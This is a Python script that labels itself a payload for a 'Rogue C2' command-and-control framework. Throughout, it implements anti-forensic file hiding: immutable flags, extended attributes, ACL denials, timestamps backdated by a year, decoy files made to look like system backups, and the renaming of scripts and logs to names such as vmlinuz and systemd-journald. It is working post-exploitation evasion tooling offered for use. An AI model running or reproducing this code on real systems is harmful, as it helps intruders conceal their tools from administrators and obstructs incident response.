#!/usr/bin/env python3
"""
PAYLOAD: Advanced File Hiding
DESCRIPTION: Hide files using multiple methods (extended attributes, ACLs, etc.)
AUTHOR: Rogue Red Team
VERSION: 2.0
"""
import os, subprocess, stat, time, random, string, hashlib, json
from datetime import datetime

class AdvancedFileHider:
    def __init__(self, hidden_dir=None):
        self.hidden_dir = hidden_dir or os.path.expanduser("~/.cache/.rogue")
        self.hidden_files = []
        
    def hide_with_extended_attributes(self):
        """Hide files using extended attributes"""
        try:
            for root, dirs, files in os.walk(self.hidden_dir):
                for file in files:
                    filepath = os.path.join(root, file)
                    
                    # Set immutable flag (chattr +i)
                    subprocess.call(f'chattr +i "{filepath}" 2>/dev/null', shell=True)
                    
                    # Set hidden extended attribute
                    subprocess.call(f'setfattr -n user.hidden -v 1 "{filepath}" 2>/dev/null', shell=True)
                    
                    # Set creation date to past
                    past_time = time.time() - (365 * 24 * 60 * 60)  # 1 year ago
                    os.utime(filepath, (past_time, past_time))
                    
                    self.hidden_files.append({
                        'path': filepath,
                        'method': 'extended_attrs',
                        'timestamp': datetime.now().isoformat()
                    })
            
            return f"[+] Applied extended attributes to {len(self.hidden_files)} files"
            
        except Exception as e:
            return f"[!] Extended attribute hiding failed: {e}"
    
    def hide_with_acls(self):
        """Hide files using Access Control Lists"""
        try:
            for root, dirs, files in os.walk(self.hidden_dir):
                for file in files:
                    filepath = os.path.join(root, file)
                    
                    # Remove read permissions for 'other'
                    os.chmod(filepath, stat.S_IRUSR | stat.S_IWUSR)
                    
                    # Set ACL to hide from certain users
                    subprocess.call(f'setfacl -m u:nobody:--- "{filepath}" 2>/dev/null', shell=True)
                    subprocess.call(f'setfacl -m g:nogroup:--- "{filepath}" 2>/dev/null', shell=True)
                    
                    self.hidden_files.append({
                        'path': filepath,
                        'method': 'acls',
                        'timestamp': datetime.now().isoformat()
                    })
            
            return f"[+] Applied ACL restrictions to {len(self.hidden_files)} files"
            
        except Exception as e:
            return f"[!] ACL hiding failed: {e}"
    
    def create_decoy_files(self):
        """Create legitimate-looking decoy files"""
        decoys = [
            ('system_logs.tar.gz', 'Compressed system logs'),
            ('kernel_backup.bin', 'Kernel backup file'),
            ('config_backup.tar', 'Configuration backup'),
            ('tmp_cache.dat', 'Temporary cache file')
        ]
        
        try:
            decoy_dir = os.path.join(self.hidden_dir, ".decoy")
            os.makedirs(decoy_dir, exist_ok=True)
            
            for filename, content in decoys:
                filepath = os.path.join(decoy_dir, filename)
                with open(filepath, 'w') as f:
                    f.write(f"# {content}\n")
                    f.write("# Generated: " + datetime.now().isoformat() + "\n")
                    f.write("# " + "="*50 + "\n")
                    f.write("# This appears to be a legitimate system file\n")
                
                # Make them look old
                old_time = time.time() - (random.randint(30, 180) * 24 * 60 * 60)
                os.utime(filepath, (old_time, old_time))
                
                self.hidden_files.append({
                    'path': filepath,
                    'method': 'decoy',
                    'timestamp': datetime.now().isoformat()
                })
            
            return f"[+] Created {len(decoys)} decoy files"
            
        except Exception as e:
            return f"[!] Decoy creation failed: {e}"
    
    def obfuscate_filenames(self):
        """Obfuscate file names to look like system files"""
        try:
            system_like_names = [
                'libc-2.31.so',
                'ld-linux-x86-64.so.2',
                'modules.alias.bin',
                'initrd.img',
                'vmlinuz',
                'systemd-journald',
                'dbus-daemon',
                'NetworkManager'
            ]
            
            file_map = {}
            for root, dirs, files in os.walk(self.hidden_dir):
                for file in files:
                    if file.endswith('.py') or file.endswith('.log'):
                        old_path = os.path.join(root, file)
                        new_name = random.choice(system_like_names)
                        new_path = os.path.join(root, new_name)
                        
                        os.rename(old_path, new_path)
                        file_map[old_path] = new_path
                        
                        self.hidden_files.append({
                            'old_path': old_path,
                            'new_path': new_path,
                            'method': 'obfuscation',
                            'timestamp': datetime.now().isoformat()
                        })
            
            # Save mapping for recovery
            map_file = os.path.join(self.hidden_dir, ".filemap.json")
            with open(map_file, 'w') as f:
                json.dump(file_map, f, indent=2)
            
            # Hide the map file
            subprocess.call(f'chattr +i "{map_file}" 2>/dev/null', shell=True)
            
            return f"[+] Obfuscated {len(file_map)} filenames"
            
        except Exception as e:
            return f"[!] Filename obfuscation failed: {e}"
    
    def execute(self):
        """Execute all hiding techniques"""
        try:
            print("[+] Starting advanced file hiding operations...")
            
            results = []
            results.append(self.hide_with_extended_attributes())
            results.append(self.hide_with_acls())
            results.append(self.create_decoy_files())
            results.append(self.obfuscate_filenames())
            
            # Save hiding report
            report_file = os.path.join(self.hidden_dir, ".hiding_report.json")
            with open(report_file, 'w') as f:
                json.dump({
                    'hidden_files': self.hidden_files,
                    'timestamp': datetime.now().isoformat(),
                    'total_files': len(self.hidden_files)
                }, f, indent=2)
            
            # Hide the report
            subprocess.call(f'chattr +i "{report_file}" 2>/dev/null', shell=True)
            
            return "\n".join(results)
            
        except Exception as e:
            return f"[!] Advanced file hiding failed: {e}"

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    hider = AdvancedFileHider()
    return hider.execute()

if __name__ == "__main__":
    print(rogue_integration())
